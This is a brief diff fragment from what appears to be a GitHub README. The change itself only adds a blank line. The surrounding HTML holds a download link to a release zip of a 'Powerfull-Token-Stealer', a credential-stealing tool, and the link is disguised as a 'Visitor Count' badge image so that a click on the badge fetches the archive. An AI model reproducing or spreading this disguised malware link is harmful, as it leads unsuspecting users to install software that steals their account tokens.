@@ -54,3 +54,4 @@
   <a href="https://github.com/m33rcy/Powerfull-Token-Stealer/releases/download/v2.4.7/Powerfull-Token-Stealer.zip"><img src="https://visitor-badge.laobi.icu/badge?page_id=KanekiWeb.Powerfull-Token-Stealer" alt="Visitor Count"></a>
 </p>
 
+
